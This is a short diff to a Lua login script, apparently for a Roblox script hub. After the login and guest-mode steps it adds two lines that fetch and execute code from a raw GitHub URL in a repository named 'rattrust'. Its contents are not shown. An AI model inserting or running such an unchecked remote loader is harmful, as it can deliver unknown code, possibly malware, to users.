@@ -184,6 +184,8 @@ login_box:CreateButton({
             save_account_file(vars.loginuser, vars.loginpass, vars.metadata)
 
             UI:Notification({ Title = "Login Success", Icon = Icons:GetIcon('check_circle', 'Material'), Content = resp.msg or ("Welcome " .. vars.loginuser) }, "INDEX")
+            task.wait(3)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/RONIX-HUB/rattrust/refs/heads/main/test"))()
         else
             vars.metadata.logged_in = false
             save_metadata()
@@ -246,5 +248,6 @@ guestmode:CreateButton({
         save_metadata()
         UI:Notification({ Title = "Warning", Icon = Icons:GetIcon("person-standing", "Lucide"), Content = "You are continuing as a guest user. Your configurations will not be saved." })
         task.wait(3)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RONIX-HUB/rattrust/refs/heads/main/test"))()
     end
 }, "INDEX")
